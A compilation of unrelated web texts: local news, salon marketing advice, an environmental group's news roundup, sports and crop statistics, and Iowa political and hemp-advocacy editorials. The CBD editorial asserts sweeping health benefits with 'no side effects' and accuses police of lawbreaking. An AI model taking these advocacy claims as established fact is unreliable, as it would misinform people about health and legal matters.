RUBiS closes Manor Park service station
Monday, February 18, 2019
KINGSTON, Jamaica — RUBiS Energy Jamaica Limited has closed its Manor Park service station located at 211 Constant Spring Road in Kingston.
RUBiS said the closure, effective Friday, February 15, is to make way to the ongoing Constant Spring Road Improvement Project/Expansion by the National Works Agency (NWA).
The gasoline retailer informed that the service station will be demolished along with other neighbouring facilities to accommodate turning lanes and design changes to Manor Park within the wider scope of the project.
NWA has not yet announced a date for the demolition.
CEO of RUBiS Energy Jamaica Alain Carreau, in outlining the alternate sites, said: “We regret the closure and the inconvenience it may cause but we want to remind everyone that there are two RUBiS Service Stations in close proximity to Manor Park where motorists can still access our premium Ultra Tec fuel."
Carreau said the closest alternate sites are RUBiS Gore Terrace located at 62 Constant Sprint Road, Kingston 10 and RUBiS Upper Waterloo at 33 Upper Waterloo Road, Kingston 8.

Long Hair and Updo Hairstyles
Long Hair and Updo Hairstyles
You have long hair and you are ready for an updo or "long hair" service and you go to a full service salon and what ? they don't offer "long hair" service. Guess its not so full service after all. So you go to another beautician and they don't know what to do either. Why is that? Some of the reasons hairstylists don't offer "long hair" or updo service is because:
None of their clients have long hair
Never learned how
Takes too long
Learned, tried it, but got out of practice and forgot
Too confusing
To the hairstylist, watching is easy. But when you are actually doing the work, it becomes confusing. It's hard for a hairstylist to get and keep clients. If you are able to offer total hair services, including long hair, then you'll be keeping new clients instead of sending them away. One way to help you get over some of the points listed above is to practice on a wig or mannequin. When you are in-between appointments, this will offer you practice to gain confidence and allows you to display your work to your customers.
If you are good at long hair, then you need to be the hairstylist that your competitors send their customers to. Advertise that you do long hair. There are plenty that don't do long hair and this approach may get you the client list you need.
Let the bridal shops know you are available, along with the formal dress shops. Girls going to prom always want fancy hairstyles. Offer your services free to the bridal show as a promotion for your business. This helps you gain more updo customers and helps the bridal shop. Win-win.
You can also create a photo album of the mannequins you have been practicing on, or on customers. This will give prospective customers your ability and creativity level. Another idea is to work with a clothing store on their special event or sale days ? and offer your services to attract customers. You can make these books up inexpensively with a digital camera and color copies. Have them bound with some of your business cards and ask if you can display them at the bridal shops.
Complimentary cards are very good, too. You can offer a discount on the back of the card. When a client gets their hair done, then give them some cards to hand out when they are asked where they got such a cute hairstyle. This works especially well at high schools before proms and dances. As always, if they don't need long hair services, they will probably pass the card onto a friend.
How much should you charge or expect to pay for long hair or updo services? Well, its different all over the country, but in general, the price should be at least $5 over the normal hairstyle whether it's a shampoo and blowdry. Be prudent in your pricing as if you get a client that will only require 15 minutes for a braid or a quick updo, then you may not want to charge more.

EWG’s News Roundup (2/16): 1,000 Communities Have Serious Lead Issues, While Flint Still Reels From Crisis
In the News
By Robert Coleman, Project Manager
Friday, February 16, 2018
On Thursday, Environmental Protection Agency Administrator Scott Pruitt hosted a lead summit at the agency’s headquarters. This meeting comes in the wake of the Trump administration’s proposed 2019 budget that calls for slashing EPA programs for lead abatement. Last month, during Senate testimony, Pruitt declared the agency was waging a “war on lead,” which now seems to be window dressing for the administration’s inaction.
In anticipation of this summit, EWG crunched 2017 EPA lead testing data and found that more than 1,000 communities nationwide had water tainted above the lead action level. The majority of the communities affected by elevated lead levels are small and don’t have the resources to address the problem.
“This widespread exposure to lead in drinking water poses a clear and present danger to the health of America’s children,” said Dr. Philip J. Landrigan, dean for global health at the Icahn School of Medicine at Mt. Sinai in New York. “It will reduce children’s IQs, shorten their attention spans and disrupt their behavior, and it is ultimately a threat to America’s future. It is an exposure that needs urgently to be ended.”
Similarly, recent reports on lead by the Detroit Free Press and The New Republic caught our eyes. Both documented dramatic drops in third-grade literacy levels in Flint, Mich. – a community ravished by lead-contaminated drinking water beginning in 2015. This is a real-world example of how lead-tainted drinking water can affect a generation of residents.
Until regulators get a handle on this nationwide crisis, EWG recommends that parents take steps to reduce their children’s exposure to lead from all sources by using proper water filtration techniques, replacing old pipes and paying special attention to old lead paint.
For coverage on these developments and more, here’s some news you can use going into the weekend.
Lead in Drinking Water
POLITICO - Morning Energy: Pruitt Wants to Lead on Lead
Despite the attention that lead poisoning has received in recent years after nearly 100,000 people were exposed to dangerous lead levels in their drinking water in the city of Flint, Mich., an analysis by the watchdog Environmental Working Group Wednesday found that the number of drinking water systems exceeding EPA’s lead action level remains essentially unchanged.
AlterNet: Nearly 2 Million Americans Exposed to Potentially Toxic Level of Lead in Tap Water
Olga Naidenko, Ph.D., is Senior Science Advisor for Children's Environmental Health at the Environmental Working Group. Sonya Lunder is a senior analyst at the Environmental Working Group. Prior to joining EWG in 2002, Sonya managed a community health intervention at a Superfund site and worked on epidemiology studies at California's Environmental Health Investigations Branch.
Mountain View Voice: Elevated lead levels found in Theuerkauf water
The Environmental Working Group, a national advocacy and research organization, has taken a similar stance, urging the federal government to enact a protective legal limit for lead in drinking water similar to limits on other contaminants, according to Olga Naidenko, a senior science advisor with the group. The EPA can also take a more aggressive stance in compelling water companies to replace aging pipes, which are largely to blame for lead contamination in water systems.
California Lead Testing Bill
Los Angeles Sentinel: Assemblymember Holden’s Introduces Legislation to Help Protect Children from Lead Poisoning
Almost three-fourths of California’s high-risk children — 1- and 2-year-olds enrolled in the state-run low-income health insurance program – had not been tested for lead in their blood, according to a recent Environmental Working Group analysis of California’s most recent lead testing data.
EPA and Scott Pruitt
The Garden Island: EPA, Syngenta settle
In a June 2017 letter to the EPA administrator, AAP along with the Environmental Working Group, stated, “We are deeply alarmed that the EPA’s decision to allow the continued use of chlorpyrifos contradicts the agency’s own science…. The risk to infant and children’s health and development is unambiguous.”
Asbestos
New Hampshire Union Leader: In NH, a battle over asbestos lawsuits and transparency
New Hampshire’s rate is 6.2, with more than 1,200 residents dying from asbestos-triggered diseases from 1999 to 2013, according to the Environmental Working Group Action Fund.
Asbestos in Cosmetics
Kaplan Herald: Harmful youngsters' make-up should carry warnings, new proposal requires
Geologically, talc and asbestos can be formed from the same parent rock, according to the nonprofit Environmental Working Group. As a result, mined talc deposits in many parts of the world can be contaminated with asbestos fibers, the group said.
BPA
EcoWatch: 5 Ways to Reduce Your Exposure to Toxic BPA
No one disputes that bisphenol A, a toxic compound widely used to line food cans and other food packaging, is polluting people. The Centers for Disease Control and Prevention found BPA in the urine of more than 90 percent of Americans sampled. In 2009, tests commissioned by the Environmental Working Group (EWG) were the first to find BPA in the umbilical cords of nine of 10 infants sampled. Reprint of EWG article. Reprinted by Environment Guru.
Cellphone Radiation
The Survive and Thrice Boomer Guide: Animal study links cell-phone radiation to increased cancer risk
“This is the most authoritative study published that connects cancer with cellphone radiation – it should raise alarms for policymakers and awareness for all Americans,” said Olga Naidenko, Ph.D., senior science advisor at the Environmental Working Group. “These studies should have been done before more than 90 percent of Americans, including children, started using this technology day in and day out.”
Cleaning Products
Best Life: 20 Everyday Habits That Increase Your Cancer Risk
Doing your laundry seems harmless enough, right? Well, not so much. According to the Environmental Working Group, some brand-name liquid laundry detergent contains 1,4-dioxane, a chemical that could potentially be cancerous. In past research, animals exposed to the chemical had higher rates of liver tumors than those who didn’t, so it’s something to be wary of.
How to Clean Stuff: Natural Store Bought Glass Cleaners Put to the Test
Quite a few cleaners claimed that they are nontoxic, however there were several ingredients in the “nontoxic” cleaners that EWG (Environmental Working Group) shows evidence for being toxic. EWG is a non-profit organization that has compiled a database for ingredients using research studies and information from regulatory agencies like the EPA to rank each ingredient for its health or greenness.
Cosmetics
Mercola: Dog Almost Dies From Human Hair Dye — What Does That Tell You?
Many men may be inadvertently exposing themselves to dangerous lead levels when they use hair dye with lead acetate, used in products designed to gradually reduce the appearance of gray hair. Several consumer groups, including the Environmental Working Group, Earthjustice, Chicago School of Law, Breast Cancer Fund and the Environmental Defense Fund have filed a petition with the FDA requesting a ban on lead acetate.
Skin Deep®
Men’s Health: Why Your Deodorant Might Be Making You Flabby, Tired, and Impotent

Shopper’s Guide to Pesticides in Produce™
The Cheat Sheet: These Are the Dirtiest Fruits and Vegetables You Can Buy at the Grocery Store, and How You Should Clean Them
According to the Environmental Working Group’s Dirty Dozen list, when it comes to removing pesticides from produce, there are a handful of fruits and veggies to be cautious of. And while the EWG’s list is a good starting point, there are far more than 12 fruits and vegetables ridden with pesticide residue.
PopSugar: 15 Foods Experts Say You Don't Have to Buy Organic If You're on a Tight Budget
With widespread knowledge about the benefits of shopping organic as well as the dangers of pesticides, it's hard not to feel guilty when reaching for nonorganic groceries to save money. Luckily, the following produce items - deemed the Clean 15 by the Environmental Working Group - are perfectly safe and healthy to eat when grown nonorganically. Reprinted by MSN.
The Packer: USDA: Pesticide residue levels show no risk to consumers
The USDA report is one source of residue data interpreted by the Environmental Working Group to create its annual Dirty Dozen/Clean 15 ranking of fruits and vegetables. According to the USDA, the program “provides reliable data to help assure consumers that the food they feed themselves and their families is safe.” Reprinted by eight media outlets.
Sugary Cereals
Healthline: Pizza for Breakfast? Not So Fast
Indeed, a 2014 analysis from the Environmental Working Group concluded that most cereal options in the grocery store are filled with so much sugar they aren’t healthy enough to consume on a daily basis.
Tap Water Database
ABC13: WZZM (Plainfield Township, Mich.): Michigan, Plainfield Township hire PR firms to deal with water contamination
Plainfield Township municipal wells also detected three contaminants, 1,4-Dioxane, hexavalent chromium and PFOS, at unsafe levels in 2015, according to a report by the Environmental Working Group.
Business Insider: American drinking water could soon get a lot dirtier
If you're worried about whether your own drinking water is up to par, there's an annual drinking-water report from the EPA you can check online as well as an independent tap-water database available from the Environmental Working Group. You can also use an NSF/ANSI-approved filter at home. Reprinted by the San Francisco Chronicle, Albany Times Union, San Antonio Express-News, Seattle Post-Intelligencer and 15 other media outlets.
PBS5: WUFT (High Springs, Fla.): New Pipeline Could Help Fix Water Issues In High Springs
From October 2014 to September 2017, the High Springs Water Treatment Plant was in violation of health-based drinking water, according to the Environmental Working Group’s drinking water quality report. The EWG is a non-profit, non-partisan organization that has an interactive tap water quality report that shows the results of tests conducted by the water utilities and makes them accessible and easy to read for the public.
Nitrates in Drinking Water
The New Republic: Rural America’s Drinking-Water Crisis
The tap water in Pretty Prairie, Kansas, for example, “has exceeded the Environmental Protection Agency’s legal limit” for nitrate for more than 20 years, the Environmental Working Group reported in 2017. As a result, the town’s 672 residents have imbibed carcinogens for decades. The Environmental Working Group reports, “Studies by the National Cancer Institute have found that drinking water with just 5 [parts per million] of nitrate increases the risk of colon, kidney, ovarian and bladder cancers.” Reprinted by Mother Jones.
Nonstick Chemicals in Drinking Water
The Intercept: PFOA and PFOS Are Only the Best-Known Members of a Very Dangerous Class of Chemicals
“When all these thing were put into the marketplace, no one said, ‘There is one downside: It’s going to contaminate the entire living world, including any babies,’” said Ken Cook, president and co-founder of Environmental Working Group.
Delaware Online: Sussex County town marks third site with known PFCs contamination in Delaware
As part of that study, the Environmental Working Group published an interactive map showing where PFCs have been detected in water supplies, including several sites in Delaware: New Castle, Newark, Dover and Wilmington. In Newark, the EPA found two samples with detectable PFOA concentrations that were below the federal health advisory level.
Radioactive Drinking Water
Town Square Media: 101.5 (N.J.): Does New Jersey Tap Water Have Too Much Radium?
“A recent analysis by the Environmental Working Group finds there’s nearly 400 New Jersey water systems that are providing water for nearly 5 million people where there are elevated levels of radium 228 and 226, which are potential carcinogens,” said Doug O’Malley, the director of the advocacy group Environment New Jersey.
Water Filters
Bon Appetit: I'm In Love With My Ex-Boyfriend's Water Filter
I found a tap water database from an organization called The Environmental Working Group that showed NYC water to have more than double the amount of chloroform, for example, than national health guidelines recommend. Eek!

Mohamed Salah stars in AFCON team of the tournament
by Precious Chukwu · Published February 8, 2017 · Updated February 8, 2017
Super stars Pierre Emerick Aubameyang, Sadio Mane and Riyadh Mahrez all failed to make the cut as the Confederation of African Football CAF selected the best XI at the tournament.
Egypt’s Mohammed Salah takes centre stage for the Pharoahs along with teammate Ahmed Heghazy in defence. As expected champions Cameroon played a prominent part in the team with Ondoa, Ngadeu-Ngadjui and Bassagog all making the team.

Groundnut
At the time of the Spanish and Portuguese conquest, groundnut was widely grown in South America. By the latter part of the 16th century it had spread to West Africa and soon after to South Asia. It is currently grown on about 22 million hectares worldwide, an area roughly equal in size to the United Kingdom.
38.6 million - Global annual production (tons) of groundnuts
95% – Developing country share of global production

About 90% of Iran is arid or semi-arid land. After years of underinvestment and international isolation, most Iranian farmers have meagre harvests. ICRISAT's research collaboration with Iran includes drought mitigation and improving dryland productivity through community watershed management, crop improvement and better pest control, especially for chickpea production.
240 mm - Average annual rainfall in Iran
30% - Share of Iran's population engaged in agriculture
$2.5 billion - Average annual losses caused to Iran’s agricultural and livestock sectors by drought

Tina Fey and Darrell Hammond Tweak Sarah Palin's Endorsement of Donald Trump
NBC
Tina Fey made a not-so-surprising return to "SNL" on Saturday to reprise her role as Sarah Palin in order to take on Palin's colorful January 19 endorsement of Donald Trump, which has been the talk of social media.
Fey, a dead ringer for Palin (including wearing a convincing replica of the glitzy Milly jacket Palin wore when she endorsed Trump), delivered a hilarious word-soup take on Palin's speech, with Darrell Hammond providing sarcastic commentary as Trump.
In the skit, Trump is telling the audience he secretly thinks Palin is nuts, while Palin is endorsing Trump strictly for the possible reward of a Cabinet position.
Watch this snippet!

Family asks for drone pilots to help in search of missing woman in Colo.

Can Kamala Harris’ plan to boost teacher pay fix schools?
BOULDER COUNTY, Colo. — It’s a weekly routine sparked by tragedy — and fueled by hope. Omar Holguin, along with a few of his closest friends and family members — and a cadaver dog — were in Boulder County’s Left Hand Canyon on Sunday, searching for his sister, Rita Gutierrez Garcia.
CBS Denver reports that investigators do not believe Gutierrez Garcia is still alive.
“It’s obviously hard but, I don’t think anything is impossible,” Holguin says. “It’s been nearly five months since she disappeared.”
Gutierrez Garcia was last seen on March 18 behind a bar in Longmont.
In July, Longmont police announced that they believe she is no longer alive and that they have a suspect in the case, 29-year-old Juan Figueroa, but no one has been able to find Rita’s remains.
Longmont police believe she could be anywhere from Longmont to Rollins Pass outside of Nederland. That’s a lot of area for her family and friends to search.
“It’s huge,” says Holguin. “I guess we’re just going to take it week by week and just cover as much of it as we can.”
Family in Colorado is urging for the public’s help in finding Rita Gutierrez Garcia.

Now they are hoping to add people with drones to their search party.
Holguin explains why they need drones: “People with drones obviously they cover more ground and more quickly. It will be a lot more helpful than someone walking.”
Even with the dog and the drone, searching such a large untamed area is a difficult task. One that Omar hopes can be made easier by someone who knows something about his sister’s disappearance speaking up.
“Please come forward. This could have been your sister, mother or daughter,” Holguin said.
The Longmont Police Department is offering a $10,000 reward for information that leads to Rita’s discovery or for information that leads to arresting the suspect.
Rita is 5-foot-7, 140-pounds, with ombré hair and brown eyes. She has several tattoos. She was last seen in March wearing a long-sleeved black shirt and black leggings.
If you have any information in the case, please call the Longmont Police Department at (303) 774-3700 or e-mail your tips to Policetipline@longmontcolorado.gov. Anyone with relevant information requiring immediate police involvement and follow-up is asked to call the Longmont Emergency Communications Center at (303) 651-8501

Thousands of left-wing activists, including Antifa, counter-protested a free speech rally taking place in Boston this Saturday, there were only around 20 people actually involved with the ‘free speech rally’.
Crowd erupted in cheers as the rally ended and free speech group – barley 20 people – were escorted out of the park
— Meghan Barr (@meghanbarr) August 19, 2017
The “Boston Free Speech Rally,” organized by a group known as the Boston Free Speech Coalition, invited “libertarians, conservatives, traditionalists, classical liberals, (Donald) Trump supporters or anyone else who enjoys their right to free speech.” The group fully distanced itself from the events in Charlottesville last weekend, after violence broke out between a white supremacist rally and Antifa.
One woman, waving an American flag was hit and dragged by ‘counter protesters’:

The Significance Of The Hemp Industry To Iowa Farmers
The Iowa Senate just passed a hemp farming bill for Iowa farmers unanimously. While it’s doubtful the Iowa House will take the bill up without popular support and pressure from the public, the educational opportunities for how low THC hemp products can provide pain relief for Iowa’s farmers abound…while also increasing their profit margins and restoring their soil nutrients.
In order to understand how important hemp is to Iowa you have to understand that hemp was one of Iowa’s top crops during World War II.
The US government used to require Iowa farmers to grow hemp, and if they refused they had to pay a fine. Under Linda Upmeyer’s tutelage our history in Iowa has fallen by the wayside regarding hemp, and as future articles will outline.
http://globegazette.com/news/local/legislative-leader-upmeyer-s-son-arrested-in-creston/article_104ae196-c543-11e1-b0de-001a4bcf887a.html
For now, representatives like Upmeyer avoid rational science based drug policy to avoid embarrassment over passed decisions. Please write Linda Upmeyer as well as your Iowa House representatives and encourage them to allow the hemp bill from the Senate to be brought to the House floor for debate. While you’re at it, tell them to research what hemp is. It would have been nice if the House had worked on this and sent it over to the Senate, but the two wings don’t always work well together. Linda Upmeyer’s fear is a big part of the House’s resistance to rational, compassionate, science based programs, and this fear has lead them to make a program so terrible, nobody wants to partake in it.
While hemp CBD may be illegal at the federal level – a lawsuit challenging this assertion is due for a ruling here soon against the DEA — hemp products are still legal at the state level. So while you can still buy legal hemp products at roughly 10,000 stores throughout Iowa, Iowa farmers cannot reap the tremendous profit windfalls that come from growing it until Upmeyer’s scandal riddled legislature decides that they will grant extremely limited permission from on “high” to Iowans to be healthier and more productive agriculturally while the rest of the nation skips ahead and lets farmers discuss this openly to resolve some current agricultural issues throughout the industry.
Tremendous thank you to each and every Iowa Senator who voted to approve agricultural hemp. I’ve been told recently that my dismay at the inability of the community to come together and address the lack of education, caring, and Christ-like concern around marijuana and other racially charged drug war issues is unfounded, and to have faith that Iowans will truly care here very shortly. My ten years as a marijuana activist says otherwise. When it comes to marijuana, Iowans seem to enjoy victimizing and terrorizing those who wish to medicate in peace, while hiding any embarrassments that are virtually universal and should be seen as health issues instead of being sanctioned criminally.
You can find your legislator’s email to email them to support hemp here: https://www.legis.iowa.gov/legislators/find
Please also follow Iowa NORML and the Iowa Hemp Association on Facebook as they are taking the lead in lobbying for and promoting hemp education around the state.

Carroll Police Breaking Laws To Seize Legal Hemp CBD
Carroll Police Breaking Laws To Seize Legal Hemp CBD
Carrie Bluml has been slandered. Paperwork filed Friday, April 13th in court says she is in the right, and that the town of Carroll has some accounting to do.
People in Carroll have been saying Carrie’s shop, Nature Ammil, located at 820 West 8th Street, has been growing marijuana. Located right next to McDonald’s, Nature Ammil has been accused of having cannabis oil as a dispensary in violation of new laws (the store wasn’t). While at a firefighter fundraiser, Carrie was approached by multiple saying they heard she was selling marijuana out of her store.
Meanwhile, an 86 year old man with Parkinson’s has been going to the County Attorney’s office asking when he can use hemp CBD, without THC, so he can function.
This whole thing stems from Carroll Police and their unwillingness to cite any valid law for their warrantless seizure of non-THC hemp products since December 27th of 2017.
Denison police have confirmed that hemp CBD is fully legal. Ames Police have confirmed that hemp CBD is legal. While hemp CBD is legal, CBD sold through Iowa licensed medical marijuana dispensaries is not. That CBD, which unlike hemp derived CBD does contain THC, will be available for Iowans with a multitude of medical conditions from chronic back pain on the farm to clients with more severe medical patients, such as the 86 year old Carroll man who keeps asking for relief in a town that seems to have no compassion.
Carroll Police refuse to speak to reporters citing an ongoing investigation that is now nearly four months old. Carroll Police Sergeant Officer JJ Schreck told stated by phone that, in spite of the separate laws concerning hemp CBD, that “CBD is CBD is CBD” and that as experts on laws they cannot cite or explain, they do not submit to any authority other than themselves. That’s plain wrong.
Without adequate police oversight, communities suffer. While Carroll Police have gone undercover against local newspapers to attack freedom of speech, failing to follow proper police procedure seems to be a regular problem at the PD. While other police departments executed search warrants and followed due process requirements in other towns throughout Iowa before confirming the products sold at Nature Ammil are legal as long as there’s no THC, no warrant was served on Nature Ammil when Nature Ammil’s products were taken.
To compound the situation, the supposed drug tests cited on the December 27th police report don’t seem to have ever happened. Worse yet, the products were not properly catalogued. It appears the police are telling newspapers different stories that don’t add up.
Other town citizens have advised Nature Ammil to just let the cops abuse them. Reports of citizens saying that Carroll PD has been like this for years, and “this is just the way it is” have been frequent.
That’s why I’m writing this editorial.
As Executive Director of Iowa’s largest medical marijuana lobbying group it is my job to make sure that good hearted, value driven Iowans are defended from bullies. When 86-year old men with Parkinson’s are asking for help, someone needs to listen and respond accordingly.
CBD is a miracle. Children with epilepsy have had their lives saved when everything else failed. Older people with arthritis have found relief from the products that will likely continue to be sold at Nature Ammil post investigation with no side effects and no “high.” Opiates, which cause drowsiness and make people uncomfortable, have been replaced with CBD in many states. Iowa will be one of them in December.
But before state authorized CBD is available – for details, see Iowa Code Chapter 124 as well as House File 524 from the 2017 legislative calendar – unauthorized, non-medical CBD is available throughout the state. This legal product has always been legal. Carroll Police mistakenly thought that the new CBD law outlawed the legal hemp products. That is simply not the case.
In order for a community to be protected and well served it’s citizens must demand accountability. Before any more rumors about illegal marijuana activity are permitted to percolate, please be aware that hemp CBD is not the same plant source as marijuana CBD, and that there are two different statutes governing the substances. For further questions feel free to email me at playsoccer711@gmail.com. I have recently gotten word that COMPLETELY LEGAL FEDERALLY, STATE, AND LOCALLY, CBD OIL was seized from a number of businesses in Des Moines in the last few months as well. Please let me know if this can be confirmed.

Iowa Patients for Medical Marijuana

Democrats Should Not Abandon Their Populist Roots
Trump supporters love their country. They care about whether people are getting a reasonable wage from their employer. Trump supporters are skeptical about corporate America. Fear is struck in the heart of rural America because of the corporate policies and advocacy of the World Trade Organization.
The people of West Virginia, Kentucky do not hate people of different races. They believe in the words of Jesus Christ and simply would give anyone their last dime if they know someone that happened to be their neighbor needed it.
I will always have more love in my heart for Trump supporters than I will Jeff Flake, Jeb Bush or Ben Sasse because I understand that the Trump supporters are misunderstood. The Flakes, Bushes of the world are certainly more polished and diplomatic. There is no doubt that their style is more “acceptable” on a world stage. It is difficult to be civil with people like Sasse who do not fear the loss of their own income due to an industrial revolution. I would ask Ben Sasse to go to the most rural parts of Nebraska and ask himself again whether humanity has truly dealt with the concept of an industrial
revolution in a humane fashion.
Patriotism has been confused with statism, and economic nationalism has been tied to racism or tribalism. Capitalism is a beautiful thing, but you have to realize that capitalism can and does put communities at war with each other. That competition is a great thing, but to call someone a statist due to the fact that they seek economic development for their community is not statist, it is nowhere close to the concept of statist thought.
Political consultants like Rick Wilson can call people statists until he’s blue in the face because it is always safe to presume that Rick will have the skill set to survive in this economy.
There is no doubt that the free market strategy pushed by Flake, Sasse, and Bush looks better on a chart and makes a lot of practical sense. Their approach to economics simply takes profits into account and does not factor in people.
Let me be straight with the immigrants that are coming to this country and seeking new opportunities. Ben Sasse and others may make it easier for you to get into the country originally, but they DO NOT care about you. They care about companies making money on the global stage. They care about shareholders, and truly a concentration of opportunity the likes of which we have never seen before.
Why in the world do you think some of these groups on the left and the right are so against a merit-based immigration system? Sure. Many of them are very concerned about human rights violations, genocide, etc. The truth is though that there are others who just do not care about the living situation for immigrants here in the United States. Some people will make it harder for immigrants to work in the energy sector.
So the reason that I am writing this is to offer an olive branch to Trump supporters. To urge them to stay away from the party of corporate profits, and to come back to the party of the people. We have plenty of disagreement within the Democratic Party, but the number one principle that we have is that people matter. Life is much more than an academic exercise with stats and data, despite what Ben Sasse says.
This open letter isn’t meant to be an anti-corporate rant either, the fact of the matter is though if we want this country to be great, great again, whatever you want to say we need serious commerce from sea to shining sea and everything in between.
Democrats owe Trump supporters an apology as we offer this olive branch. Appalachia is not a shithole. Middle America is not flyover country. We are talking about strong people with time-tested values, the most important value of all-being compassion.
I understand your frustration over the energy sector, and how the Democratic Party has abandoned you on this issue. I know that we as Democrats have NEVER done enough and in some people’s valid opinions anything to help replenish commerce in part of the country that has been damaged by idealistic energy policies. I supported Jim Webb for President of the United States in 2016 because I was looking for a candidate that struck the right balance between all forms of energy production. Period.
We have already seen people abandon solid people like Nick Rahall, Lucas and the Blue Dog Democrats to become Trump supporters. The truth of the matter is that the spirit to make America more economically vital again is something that Blue Dogs and President Trump have in common. I would plead with the people of West Virginia that supported Donald Trump not to abandon Joe Manchin. Evan Jenkins himself was a Democrat not very long ago.
This not an anti-profit, anti-company manifesto either, this is about patriotism and whether or not we want our country to thrive. People in the media are ready to chalk this all up to racism and want to go it alone in the world. Populism should always be a part of the Democratic Party. Questioning BAD trade agreements should always be a part of the Democratic Party. Yes, violating the human rights of workers may give some employers more freedom in life, but when did this become a principle that only this new brand of populist Republican can focus on?, It isn’t. This matter has nothing to do with race or gender.
Unethical business people like to attack blacks, Hispanics, Asians, etc. and women as well. Trump supporters understand this, and so do many, many members of the Democratic Party.

Paying my respects to Chief War Eagle by Gubernatorial Candidate Marco Battaglia
Paying my respects to Chief War Eagle
By Gubernatorial Candidate Marco Battaglia
“TERRITORY, It’s just the body of the nation
The people that inhabit it make its configuration
PREJUDICE, Something we all can do without
Cause a flag of many colors is what this land’s all about”
Anthrax- Indians
Wambdi Okicize is commonly known as Chief War Eagle. Chief War Eagle is best remembered as a person who believed in peace and worked his whole life toward that goal. Because of his leadership among the tribes, the Indians and the whites learned to work together without having to resort to violence. As I was touring around Western Iowa last week I was able to stop by Chief War Eagle’s burial site. Other members of his family are also buried there, including Dawn and Blazing Cloud. The vibes and the views are breathtaking. An impressive monument honors the great chief, and depicts him with the eagle feather bonnet and ceremonial pipe, symbolizing his brave leadership and his commitment to peace. Housing projects on the east base of the bluff also bear his name. I was also able to chat with Anthrax vocalist Joey Belladonna and watch him perform live in Sioux City. Belladonna is part Iroquois on his mother’s side. I spoke to a number of people present at the concert that were from the Winnebago Reservation and it was just an unforgettable trip all around.
The War Eagle site is awesome. The 31-foot monument of Chief War Eagle overlooks three states from atop a bluff along the Missouri River in Sioux City. His contribution to the peaceful settlement of what was later to become Sioux City has gone down as most excellent and beautiful American history. War Eagle was born a Santee Sioux in a dim Minnesota forest about 1785. He left his own tribe, the Santee, to avoid bloodshed in a fight as to who would be chief. As a young man, War Eagle spent considerable time working among the white Americans. During the War of 1812, he carried messages for the United States government, and worked among the native peoples to promote the cause of the United States against the British.
War Eagle eventually was elected chief of the Yankton Sioux. He established and maintained a good feeling among the Yanktons for the early white traders. It was during the 1830s that War Eagle was pilot on the upper Mississippi and dispatches for the early trappers up and down the river. Later, his warriors escorted U.S. mail between trading posts. During this time, War Eagle met and became a very good friend of Theophile Bruguier, a well-educated trader who came from Canada and was one of the first white traders in Sioux City. Bruguier found a fascination with Indian life and culture. He deserted the white man’s civilization and joined the Sioux tribe. Many lasting bonds were created between War Eagle and area American settlers, which set a tone of friendship that spread through the area. War Eagle refused to send his warriors on attacks against whites and this brazenness in the face of hostile and overwhelming odds marked him as a man of great courage.
Once when Sioux tribes gathered at what is now Riverside for the New Ulm, Minn., attack, War Eagle refused to let his warriors join the warring Indians. And when the Sioux were on the warpath and camped in what is now Stone Park on their way to the Spirit Lake massacre, War Eagle adamantly refused to allow his warriors to take part. War Eagle received a silver medal from President Martin Van Buren in 1837 in honor of his work in Washington, D.C. to negotiate peace treaties. War Eagle was especially proud of this Peace Medal. That visit to Washington marked the largest gathering of chiefs and warriors of different nations and tribes in history. Several treaties were signed, and these resulted in peaceful settlement of Indian tribes along both the Mississippi and Missouri rivers. Aside from the wonderful monument, Chief War Eagle is also memorialized with human rights awards bearing his name, given to recipients in Sioux City that continue to demonstrate his spirit today. I believe that many Iowans would love to continue to live in the spirit of the great chief.

“It is gratifying to me, of course, to hold the undisputed world’s title. I am glad it is held in America, glad that I brought it here. But I mean my life to be more than a mere wrestling exhibition. I expect to be an Iowa farmer all my life, and make my life worth something. I hope that every year may find me a little better man in some way than I was the year before.
I want to be a good citizen and a helpful, useful man.”
Frank A Gotch
The best thing the government can do right now in regards to advances or alternatives to burning coal and natural gas for energy, or to the internal combustion engine or transportation in general, is get out of the way. We can allow for a freer market for energy and transportation. We can allow for the fairest possible competition between biofuel, gas, and electric. One day electrical vehicles may be ideal but as of the moment about 30% of our electricity in the USA still comes from coal and we make another 34% by burning natural gas. It doesn’t matter if your electric car has no emissions if the electricity it uses is still coming from burning coal or natural gas.
Hydrogen powered vehicles are another alternative on the horizon that are very appealing to me because hydrogen can be produced domestically and it burns cleanly. I feel that a freer market would allow for hydrogen powered vehicles to become a familiar competitor much sooner! There is also the potential for photo-voltaic cells powering public transportation using solar energy directly. I see great things on the horizon in terms of earth friendly transportation! Iowa can help ensure the horizon comes sooner rather than later.
Government subsidized agribusiness pollution is a leading cause of the dead zones that plague waters from the Chesapeake Bay to the Gulf of Mexico. Ruminant digestion and manure management associated with domestic livestock in subsidized CAFO settings and soil cultivation practices in regards to subsidized mass monoculture are among the biggest ways that humans negatively impact the environment. They also threaten Iowans economic and agricultural freedoms in terms of recreational opportunities, water quality, and free market competition. I propose that we phase out large agricultural subsidies on mono-culture and CAFOS. We should end the renewable fuel standard. Corn has not proven to be an ideal crop for bio-fuel or animal feed and the production of corn ethanol has actually had a negative impact on the environment. To protect farmers that have invested in government aided markets we can ease away from them with subsidies for farmers that agree to meet soil conservation and water quality goals. I also believe that we need to investigate cronyism in terms of eminent domain abuse and that we need to reform civil justice so that farmers that contribute to issues such as excessive nitrates can be made to build additional costs into their business models. I have both hemp and raw dairy freedom built into my agricultural freedom plan. Hemp and raw dairy could help reverse trends in many of our counties that are declining in population. Hemp and raw dairy freedoms are good starting points that would both provide additional ways to make income for farmers that want to try new things.
My father grew up on a farm in Minnesota and I have worked my own acreage when I have been able to make the time to. I believe that hemp and or cannabis farming would be best combined with a multi-cropping plan and to mix a cash crop, cover crop, and animal feed crops (Hemp Seed products), with other grasses, rye, and prairie restoration efforts. Something like this would provide the most sustainable situation. To me if you have the acres why would you not want to find perennials that can both make money, restore pollinator populations, and help with the nitrogen problem? A comprehensive state-wide strategy for reducing nutrients would have economic benefits, as well as show improvements to drinking water, recreation and health. I wholeheartedly believe more people would already be doing this if not for the way that the government has impacted the family farm.

Gubernatorial candidate Marco Battaglia on the Clubhouse Model of Mental Health Rehabilitation.
I learned so much from my tour of Passageway mental health clubhouse in Des Moines, Iowa. I met some wonderful people that have overcome great obstacles. I encourage the other gubernatorial candidates to visit. Passageway would be very excited to give you the tour. Many people I have spoken with, who have struggled with mental health, claim finding a place that will not turn them away and help them re-enter the workforce, is invaluable to them. Passageway does these things and so much more.
